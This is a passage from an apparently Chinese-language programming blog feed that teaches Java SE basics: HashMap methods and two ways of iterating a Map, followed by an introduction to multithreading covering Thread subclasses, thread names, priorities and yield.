class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> 集合;<br><br><span class="hljs-keyword">import</span> java.util.Collection;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Set;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapText01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//创建Map集合</span><br>        Map&lt;Integer,String&gt; student = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Integer, String&gt;();<br><br>        <span class="hljs-comment">//添加数据</span><br>        student.put(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;A&quot;</span>);<br>        student.put(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;B&quot;</span>);<br>        student.put(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;C&quot;</span>);<br>        student.put(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;D&quot;</span>);<br>        student.put(<span class="hljs-number">5</span>,<span class="hljs-string">&quot;E&quot;</span>);<br>        student.put(<span class="hljs-number">6</span>,<span class="hljs-string">&quot;F&quot;</span>);<br>        student.put(<span class="hljs-number">7</span>,<span class="hljs-string">&quot;G&quot;</span>);<br>        student.put(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;H&quot;</span>);<br>        student.put(<span class="hljs-number">9</span>,<span class="hljs-string">&quot;I&quot;</span>);<br>        student.put(<span class="hljs-number">10</span>,<span class="hljs-string">&quot;J&quot;</span>);<br>        student.put(<span class="hljs-number">11</span>,<span class="hljs-string">&quot;K&quot;</span>);<br>        student.put(<span class="hljs-number">12</span>,<span class="hljs-string">&quot;L&quot;</span>);<br>        student.put(<span class="hljs-number">13</span>,<span class="hljs-string">&quot;M&quot;</span>);<br>        student.put(<span class="hljs-number">14</span>,<span class="hljs-string">&quot;N&quot;</span>);<br>        student.put(<span class="hljs-number">15</span>,<span class="hljs-string">&quot;O&quot;</span>);<br>        student.put(<span class="hljs-number">16</span>,<span class="hljs-string">&quot;P&quot;</span>);<br><br>        <span class="hljs-comment">//判断集合中是否包含key/values</span><br>        <span class="hljs-type">Boolean</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> student.containsKey(<span class="hljs-number">3</span>);<br>        System.out.println(t);      <span class="hljs-comment">//true</span><br>        <span class="hljs-type">Boolean</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> student.containsValue(<span class="hljs-string">&quot;Z&quot;</span>);<br>        System.out.println(b);      <span class="hljs-comment">//false</span><br><br>        System.out.println(<span class="hljs-string">&quot;========================================&quot;</span>);<br><br>        <span class="hljs-comment">//通过key获取values</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> student.get(<span class="hljs-number">5</span>);<br>        System.out.println(obj);        <span class="hljs-comment">//E</span><br><br>        System.out.println(<span class="hljs-string">&quot;========================================&quot;</span>);<br><br>        <span class="hljs-comment">//判断集合中元素个数是否为0</span><br>        <span class="hljs-type">Boolean</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> student.isEmpty();<br>        System.out.println(b1);     <span class="hljs-comment">//false</span><br><br>        System.out.println(<span class="hljs-string">&quot;========================================&quot;</span>);<br><br>        <span class="hljs-comment">//获取集合中所有的key</span><br>        Set&lt;Integer&gt; key = student.keySet();<br>        <span class="hljs-keyword">for</span>(Integer keys : key)&#123;<br>            System.out.println(keys);<br>        &#125;  <span class="hljs-comment">//[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16]</span><br><br>        System.out.println(<span class="hljs-string">&quot;========================================&quot;</span>);<br><br>        <span class="hljs-comment">//通过key删除键值对儿</span><br>        <span class="hljs-comment">//Object obj1 = student.remove(6);</span><br>        <span class="hljs-comment">//System.out.println(obj1);</span><br><br>        System.out.println(<span class="hljs-string">&quot;========================================&quot;</span>);<br><br>        <span class="hljs-comment">//获取键值对儿个数</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> student.size();<br>        System.out.println(i);      <span class="hljs-comment">//16</span><br><br>        System.out.println(<span class="hljs-string">&quot;========================================&quot;</span>);<br><br>        <span class="hljs-comment">//获取所有的values,返回一个collection</span><br>        Collection&lt;String&gt; colle = student.values();<br>        System.out.println(colle); <span class="hljs-comment">//[A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P]</span><br><br>        System.out.println(<span class="hljs-string">&quot;========================================&quot;</span>);<br><br>        <span class="hljs-comment">//将Map集合转换为Set集合</span><br>        Set&lt;Map.Entry&lt;Integer,String&gt;&gt; s1 = student.entrySet();<br>        System.out.println(s1);<br>        <span class="hljs-comment">//[1=A, 2=B, 3=C, 4=D, 5=E, 6=F, 7=G, 8=H, 9=I, 10=J, 11=K, 12=L, 13=M, 14=N, 15=O, 16=P]</span><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></code></pre><h4 id="十、遍历Map集合的两种方式（一）"><a href="#十、遍历Map集合的两种方式（一）" class="headerlink" title="十、遍历Map集合的两种方式（一）"></a>十、遍历Map集合的两种方式（一）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> 集合;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Set;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 如何遍历Map集合？</span><br><span class="hljs-comment">*   第一种方式:先循环遍历拿到key,通过key找到对象value</span><br><span class="hljs-comment">* */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapText02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//创建Map集合</span><br>        Map&lt;Integer,String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Integer, String&gt;();<br><br>        <span class="hljs-comment">//向集合中添加数据</span><br>        map.put(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;张三&quot;</span>);<br>        map.put(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;李四&quot;</span>);<br>        map.put(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;王五&quot;</span>);<br>        map.put(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;赵六&quot;</span>);<br>        map.put(<span class="hljs-number">5</span>,<span class="hljs-string">&quot;Make&quot;</span>);<br>        map.put(<span class="hljs-number">6</span>,<span class="hljs-string">&quot;Tom&quot;</span>);<br>        map.put(<span class="hljs-number">7</span>,<span class="hljs-string">&quot;Rocky&quot;</span>);<br><br>        <span class="hljs-comment">//遍历Map集合</span><br>        <span class="hljs-comment">//第一种方式:先循环遍历拿到key,通过key找到对象value</span><br>        <span class="hljs-comment">//迭代器</span><br>        Set&lt;Integer&gt; keys = map.keySet(); <span class="hljs-comment">//使用&quot;V get(Object key)----&gt;通过key获取value&quot;</span><br><br>        Iterator&lt;Integer&gt; it = keys.iterator(); <span class="hljs-comment">//获取迭代器</span><br>        <span class="hljs-keyword">while</span> (it.hasNext())&#123;<br>            <span class="hljs-type">Integer</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> it.next();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> map.get(key);<br>            System.out.println(key + <span class="hljs-string">&quot;----&gt;&quot;</span> + value);<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;=================================&quot;</span>);<br><br>        <span class="hljs-comment">//foreach</span><br>        <span class="hljs-keyword">for</span>(Integer i : keys)&#123;<br>            System.out.println(i + <span class="hljs-string">&quot;----&gt;&quot;</span> + map.get(i));<br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="十一、遍历Map集合两种方式-二"><a href="#十一、遍历Map集合两种方式-二" class="headerlink" title="十一、遍历Map集合两种方式(二)"></a>十一、遍历Map集合两种方式(二)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> 集合;<br><span class="hljs-keyword">import</span> java.util.*;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 如何遍历Map集合？</span><br><span class="hljs-comment"> *   1.第一种方式:先循环遍历拿到key,通过key找到对象value</span><br><span class="hljs-comment"> *     第二种方式:通过把Map转换为Set集合&quot;Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet()----&gt;将Map集合转为Set集合&quot;</span><br><span class="hljs-comment"> *   2.建议使用第二种方式的for增强遍历，因为效率高，适合在大量数据环境下使用</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapText03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//创建Map集合对象</span><br>        Map&lt;Integer, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Integer, String&gt;();<br>        <span class="hljs-comment">//集合中添加元素</span><br>        map.put(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;小米&quot;</span>);<br>        map.put(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;华为&quot;</span>);<br>        map.put(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;OPPO&quot;</span>);<br>        map.put(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;VIVO&quot;</span>);<br>        map.put(<span class="hljs-number">5</span>, <span class="hljs-string">&quot;三星&quot;</span>);<br>        map.put(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;一加&quot;</span>);<br>        map.put(<span class="hljs-number">7</span>, <span class="hljs-string">&quot;魅族&quot;</span>);<br>        <span class="hljs-comment">//先调用entrySet()方法，在使用迭代器</span><br>        Set&lt;Map.Entry&lt;Integer, String&gt;&gt; it = map.entrySet();<br>        <span class="hljs-comment">//获取迭代器</span><br>        Iterator&lt;Map.Entry&lt;Integer, String&gt;&gt; it2 = it.iterator();<br>        <span class="hljs-keyword">while</span> (it2.hasNext()) &#123;<br>            <span class="hljs-comment">//数据类型 变量名 = 引用.next();</span><br>            Map.Entry&lt;Integer, String&gt; node = it2.next();<br>            <span class="hljs-type">Integer</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> node.getKey();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> node.getValue();<br>            System.out.println(key + <span class="hljs-string">&quot;==&quot;</span> + value);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;==============================================&quot;</span>);<br>        <span class="hljs-comment">//foreach(数据类型 变量名 ：使用Set()方法的变量名 )</span><br>        <span class="hljs-comment">//建议使用这种方式，效率高，适合在大量数据环境下使用</span><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;Integer, String&gt; node : it) &#123;<br>            System.out.println(node.getKey() + <span class="hljs-string">&quot;---&gt;&quot;</span> + node.getValue());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSe</tag>
      
      <tag>集合</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSe基础---多线程</title>
    <link href="/2020/05/13/JavaSe%E5%9F%BA%E7%A1%80---%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    <url>/2020/05/13/JavaSe%E5%9F%BA%E7%A1%80---%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p><a name="27fc96f4"></a></p><h2 id="1-Java中的多线程"><a href="#1-Java中的多线程" class="headerlink" title="1 - Java中的多线程"></a>1 - Java中的多线程</h2><p><a name="7696e88b"></a></p><h3 id="1-1-进程"><a href="#1-1-进程" class="headerlink" title="1.1 - 进程"></a>1.1 - 进程</h3><blockquote><p>进程就是正在运行中的应用程序（进程是驻留在内存中）</p></blockquote><ul><li>是系统执行资源分配和任务调度的独立单位</li><li>每个进程都有自己的占用的存储空间和系统资源<br>  <a name="e213374e"></a></li></ul><h3 id="1-2-线程"><a href="#1-2-线程" class="headerlink" title="1.2 - 线程"></a>1.2 - 线程</h3><blockquote><p>线程就是进程中的单个顺序控制流，也可以理解成是一条执行路径</p></blockquote><ul><li><p>单线程：一个进程中包含一个顺序控制流</p></li><li><p>多线程：一个进程中包含多个顺序控制流<br>  <a name="5ce87190"></a></p></li><li><blockquote><p>  一、什么是线程，什么是进程</p><p>  1.进程是一个应用程序，<strong>资源分配的基本单位</strong></p><p>  2.线程是一个进程中的执行场景&#x2F;执行单元；一个进程可以启动多个线程，是<strong>程序执行的基本单位</strong></p><p>  二、对于java程序来说，当在DOS窗口输入命令后，会先启动jvm，而jvm就是一个进程，同时再启动一个垃圾回收线程负责回收，至少再目前的java程序中，至少有两个线程并发，一个是垃圾回收线程，一个是执行main方法的主线程</p><p>  三、<strong>进程<strong><strong>A</strong></strong>和进程<strong><strong>B</strong></strong>的内存独立不共享</strong></p><p>  四、<strong>线程<strong><strong>A</strong></strong>和线程**<strong>B</strong></strong>，堆内存和方法区内存共享，但是栈内存独立，一个线程一个栈。*<em>假设有十个线程，会有10个栈空间，每个栈都是独立的互不干扰，各自执行各自的，这就是多线程并发。<strong>java</strong></em><em>中的多线程机制目的就是为了提高程序的处理效率</em>*</p><p>  五、*<em>执行一个线程就是执行该线程的</em>***run()**<strong>方法中的代码</strong></p></blockquote></li></ul><h3 id="1-3-多线程的实现方式一"><a href="#1-3-多线程的实现方式一" class="headerlink" title="1.3 - 多线程的实现方式一"></a>1.3 - 多线程的实现方式一</h3><ul><li>继承于Thread类<br>1、自定义一个MyThread类，去继承Thread类<br>2、在MyThread类中重写run（）方法<br>3、在测试类中创建MyThread类的对象<br>4、启动线程</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo04;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  自定义线程类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyThread</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyThread</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">super</span>(name);<br>    &#125;<br><br>    <span class="hljs-comment">//run方法时用来布置多线程任务的方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++) &#123;<br>            System.out.println(<span class="hljs-built_in">this</span>.getName() + <span class="hljs-string">&quot;= &quot;</span> + i);<br>        &#125;<br>    &#125;<br>&#125;<br>----------------------------------------------------------<br><span class="hljs-keyword">package</span> demo04;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  线程测试类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo04</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//创建自定义线程对象（创建线程）</span><br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>();<br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t02</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>();<br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t03</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-string">&quot;线程03&quot;</span>);<br><br>        <span class="hljs-comment">//通过setName方式设置线程名，是补救的方式</span><br>        t01.setName(<span class="hljs-string">&quot;线程01&quot;</span>);<br>        t02.setName(<span class="hljs-string">&quot;线程02&quot;</span>);<br>        <span class="hljs-comment">//给线程设置名字</span><br>        Thread.currentThread().setName(<span class="hljs-string">&quot;主线程&quot;</span>);<br><br><br>        <span class="hljs-comment">//启动线程</span><br>        t01.start();<br>        t02.start();<br>        t03.start();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++) &#123;<span class="hljs-comment">//Thread.currentThread()  获取当前正在运行的线程对象</span><br>            System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;= &quot;</span> + i);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="c2ea4df3"></a></p><h3 id="1-4-设置和获取线程名"><a href="#1-4-设置和获取线程名" class="headerlink" title="1.4 - 设置和获取线程名"></a>1.4 - 设置和获取线程名</h3><ul><li>设置线程名 <ul><li><code>setName(String name)</code>:设置线程名</li><li>通过带参构造方法设置线程名</li></ul></li><li>获取线程名 <ul><li><code>getName()</code>:返回字符串形式的线程名</li><li><code>Thread.currentThread()</code>: 返回正在运行的线程对象<br>  <a name="e4cd0bce"></a></li></ul></li></ul><h3 id="1-5-线程调度"><a href="#1-5-线程调度" class="headerlink" title="1.5 - 线程调度"></a>1.5 - 线程调度</h3><ul><li>线程调度模型 <ul><li>分时调度模型：所有的线程轮流使用CPU，平均分配每个线程占用CPU的时间。</li><li>抢占式调度模型：优先让优先级高的线程使用CPU，如果线程的优先级相同，那么就会随机选择一个线程来执行，优先级高的占用CPU时间可能相对来说会高出那么一点点。</li></ul></li></ul><blockquote><p>Java中的JVM使用的就是抢占式调度模型</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo05;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  线程调度模型</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//创建线程</span><br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-string">&quot;线程01&quot;</span>);<br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t02</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-string">&quot;线程02&quot;</span>);<br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t03</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-string">&quot;线程03&quot;</span>);<br><br>        <span class="hljs-comment">//分别获取3个线程的优先级，优先级默认为5</span><br><span class="hljs-comment">//        System.out.println(t01.getPriority());</span><br><span class="hljs-comment">//        System.out.println(t02.getPriority());</span><br><span class="hljs-comment">//        System.out.println(t03.getPriority());</span><br><br>        <span class="hljs-comment">//设置线程优先级</span><br>        t01.setPriority(Thread.MIN_PRIORITY);  <span class="hljs-comment">//小  -  理论上最后执行完毕</span><br>        t02.setPriority(Thread.NORM_PRIORITY);<br>        t03.setPriority(Thread.MAX_PRIORITY);  <span class="hljs-comment">//大   -  理论上来讲最先执行完毕</span><br><br>        <span class="hljs-comment">//开启线程</span><br>        t01.start();<br>        t02.start();<br>        t03.start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="36b7cdb6"></a></p><h3 id="1-6-线程控制"><a href="#1-6-线程控制" class="headerlink" title="1.6 - 线程控制"></a>1.6 - 线程控制</h3><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>void yield()</code></td><td>使当前线程让步，重新回到争夺队列中</td></tr><tr><td><code>static void sleep(long ms)</code></td><td>使当前正在运行的线程停留指定的毫秒数</td></tr><tr><td><code>void join()</code></td><td>等死（等待当前线程销毁后，再执行其它线程）</td></tr><tr><td><code>void setDaemon(boolean on/off)</code></td><td>标记为守护线程，当运行的线程都是守护线程时，JVM停止运行</td></tr></tbody></table><ul><li>yield</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo06;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span>  <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyThread</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyThread</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">super</span>(name);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-number">30</span> == i)&#123;<span class="hljs-comment">//当i循环到30时，调用yield方法</span><br>                Thread.<span class="hljs-keyword">yield</span>();<span class="hljs-comment">//使当前线程让步</span><br><span class="hljs-comment">//                                1、让步之后回到争夺队列中马上争夺到执行权，连续执行的效果</span><br><span class="hljs-comment">//                                